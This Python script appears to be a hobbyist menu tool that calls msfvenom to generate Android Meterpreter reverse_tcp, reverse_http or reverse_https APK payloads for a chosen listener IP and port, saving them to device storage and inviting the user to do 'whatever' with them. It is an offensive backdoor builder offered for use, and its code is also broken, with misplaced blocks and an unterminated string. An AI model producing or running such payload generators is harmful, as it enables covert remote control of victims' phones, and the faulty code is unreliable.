#!/usr/bin/python3 env

# Coded By : ULTR3H3CK4R

import os
import time
import Rio_payloads as back



type = ["reverse_tcp", "reverse_http", "reverse_https"]
cyan = "\033[1;36m"
blue = "\033[1;34m"
norml= "\033[0m"

def output_pld (output):
        if os.path.exists ("/sdcard/Rio_payloads/"+output) == True:
                back.finaly ()
                print (cyan+"\n\nYour Payload Has generated successfull.\nIt has saved in Your \033[1;31m Internal Storage\n\033[1;36min \033[1;31m  Rio_payloads "+cyan+"  Folder"+cyan+" with the name \n\033[1;31m"+output)
                print (cyan+"\nGo there And do Whatever You  want  To\ndo With it\n\n")
                print ("\n\n    \033[1;36m[\033[1;34m1\033[1;36m]  \033[1;36m Back")
                print ("        \033[1;36m[\033[1;34m2\033[1;36m]  \033[1;36m Exit")
                back_opt = int (input ("\n\n\033[1;34multr3 \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mh3ck4r\033[1;31m/~  \033[1;36m"))
                if back_opt == 2:
                        back.exite ()
                else:
                        back.main ()
        else:
                print ("Your Payload has not Generated Successfully. Please Try again.")



def Android ():
        back.banner ()
        android_pld = int (input ("""\033[1;34mSelect type of Android Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34multr3 \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mh3ck4r\033[1;31m/~  \033[1;36m"""))

        if android_pld < 4:
                payloads = "android/meterpreter/"+type[android_pld-1]
                lhost = (input ("\n\033[1;34mENTER Local IP :---->>> \033[1;36m ")).replace (" ","")
                lport =  (input ("\033[1;34mENTER Port No. :---->>> \033[1;36m ")).replace (" ","")
                output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".apk").replace (" ","")
                pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/Rio_payloads/"+output
                print (cyan+"Creating Payload...\n")
                os.system (pld)
                output_pld (output)

        if android_pld == 4:
                back.exite ()

if android_pld > 4:
                try:
                        raise ValueError
                except ValueError:
                        print ("\033[1;34multr3 \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mh3ck4r\033[1;31m/~"+cyan+"
                        Android ()

def main ():
        exit ()

if __name__ == "__main__":
        try:
                time.sleep (3)
                exit ()
        except KeyboardInterrupt:
                print ("\n\n\033[1;34multr3 \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mh3ck4r\033[1;31m/~"+cyan+"  By By"+norml)
        except ValueError:
                print ("\n\n\033[1;34multr3 \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mh3ck4r\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
        except TypeError:
                print(" Wrong input")
